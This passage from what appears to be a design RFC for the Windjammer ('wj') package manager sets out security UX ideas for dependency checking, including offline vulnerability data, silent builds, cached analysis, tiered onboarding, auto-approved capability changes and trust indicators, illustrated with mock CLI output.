Using offline security database (downloaded 2026-03-21)...

✅ Scanned 23 dependencies
⚠️  Found 1 vulnerability (from offline DB)

old-package@2.0.0
  └─> CVE-2024-1234 (HIGH)
  └─> Info from offline DB (may be outdated)

Database age: 15 days old
Recommendation: Update database when next online
  └─> wj security download-db --offline-bundle
```

**Benefits:**
- Security audits work offline
- Vulnerability data bundled (640 MB)
- 90-day validity (update quarterly when online)
- No network needed for daily builds
- Best of both worlds (security + air-gapped)

---

## Silence is Golden: Minimize Interruptions

### The Problem: Every Build Shouldn't Be a Security Quiz

**Bad UX (noisy):**

```
wj build

Checking security...
  ✅ serde@1.0.0 (trusted)
  ✅ tokio@1.0.0 (trusted)
  ✅ clap@4.0.0 (trusted)
  ... (47 more)
  
✅ All dependencies approved
✅ No security issues found
✅ Capability checks passed
✅ Build proceeding...

Build complete ✅
```

**Good UX (silent):**

```
wj build

Build complete in 2.3s ✅
```

**Only interrupt for:**
1. **First-time imports** (never seen before)
2. **Security issues** (actual problems)
3. **Version updates** (capabilities changed)

**Silent approval for:**
1. **Cached/known packages** (seen before, approved)
2. **Re-builds** (no dependency changes)
3. **Common patterns** (matches learned preferences)

---

## Smart Caching: Don't Re-Analyze Same Package

### The Problem: Re-Analyzing Same Package Wastes Time

**Bad:**

```
# Monday
wj add reqwest
Security analysis: 5 seconds ⏱️
✅ Approved

# Tuesday (different project)
wj add reqwest
Security analysis: 5 seconds ⏱️  ← WASTED TIME!
✅ Approved
```

**Good (global cache):**

```
# Monday
wj add reqwest
Security analysis: 5 seconds ⏱️
✅ Approved
✅ Cached globally (~/.wj-security-cache/)

# Tuesday (different project)
wj add reqwest
✅ Approved (used cached analysis, instant)
```

**Cache location:** `~/.wj-security-cache/reqwest@1.0.0.json`

**Cache includes:**
- Trust score
- Capability analysis
- Community signals
- Timestamp (expires after 30 days)

**Benefit: Analysis happens once, used everywhere.**

---

## Progressive Onboarding: Gradual Complexity

### Tier 1: Beginners (Day 1-7)

**Zero security prompts. Just build.**

```bash
wj new hello-world

✅ Created project
✅ Auto-configured security (smart defaults)

wj build
✅ Build complete

# That's it! No security concepts introduced.
```

**All security happens silently in the background.**

### Tier 2: Casual Users (Week 2-4)

**Minimal prompts for common decisions.**

```bash
wj add reqwest

⚠️  Quick question: Allow network access? (Y/n) y
✅ Added

# One prompt, simple choice. No scary details.
```

### Tier 3: Power Users (Month 2+)

**More control, but still streamlined.**

```bash
wj add some-package --restrict net_egress:api.example.com

✅ Added with domain restriction

# Advanced features available when needed.
```

### Tier 4: Security Engineers (Anytime)

**Full control and transparency.**

```bash
wj security audit --full
wj security show some-package --detailed
wj security trace net_egress:api.example.com
wj capabilities optimize

# All tools available, but hidden from beginners.
```

**Philosophy: Reveal complexity gradually. Don't overwhelm beginners.**

---

## Frictionless Updates: Smart Capability Change Detection

### The Problem: Every Update Triggers Review

**Bad UX:**

```
# Monday: Upgrade http-client 1.0 → 2.0
wj update http-client

⚠️  Capability change detected

Old: <net_egress>
New: <net_egress> + <fs_write:./cache/*>

New capability: fs_write:./cache/*
Reason: Added response caching

Allow? (y/n) y

# Tuesday: Upgrade logger 1.0 → 1.1
wj update logger

⚠️  Capability change detected
...

# Wednesday: Upgrade database-driver 2.0 → 2.1
wj update database-driver

⚠️  Capability change detected
...

# User: "I'm drowning in capability reviews!"
```

**Good UX (smart change detection):**

```
wj update http-client

Capability change review:

http-client 1.0.0 → 2.0.0
└─> Added: fs_write:./cache/*
└─> Reason: Response caching (common pattern)

Analysis:
  ✅ 65% of HTTP clients add caching in v2+
  ✅ Common, expected pattern
  ✅ Low risk

Auto-approve similar changes? (Y/n) y
  ✅ Future caching additions will be auto-approved

✅ Updated

# Later updates are silent
wj update ureq
✅ Updated (auto-approved: added caching, matches pattern)

wj update hyper
✅ Updated (auto-approved: added caching, matches pattern)
```

**One decision, many updates. Cognitive load: 10 → 1.**

---

## Visual Trust Indicators (At-a-Glance Safety)

### The Problem: Can't Tell at a Glance If Package Is Safe

**Solution: Visual trust indicators in `wj list`:**

```bash
wj list

Dependencies (50):

🟢 serde@1.0.0            (trust: 9.8, 50M downloads) ✅ SAFE
🟢 tokio@1.0.0            (trust: 9.7, 40M downloads) ✅ SAFE
🟢 clap@4.0.0             (trust: 9.5, 30M downloads) ✅ SAFE
🟡 new-json-lib@0.1.0     (trust: 7.2, 150 downloads) ⚠️  NEW
🔴 suspicious-lib@1.0.0   (trust: 4.1, 8 downloads)   ⚠️  REVIEW

Legend:
🟢 High trust (9.0-10.0) - Well-established, safe
🟡 Medium trust (7.0-8.9) - Emerging, monitor
🔴 Low trust (0-6.9) - New/suspicious, review

Review suspicious:
  wj security show suspicious-lib
```

**At-a-glance: Most dependencies are green (safe), one red (needs attention).**

---

*This RFC addresses the critical "first import" vulnerability identified during WJ-SEC-03 review. By adding capability profiles and multi-signal analysis, Windjammer can detect malicious packages at import time, not just on updates. Round 2 improvements address false positives at scale, progressive onboarding, and better error messages. Round 3 improvements focus on eliminating security fatigue through silent success, smart defaults, and graduated complexity.*
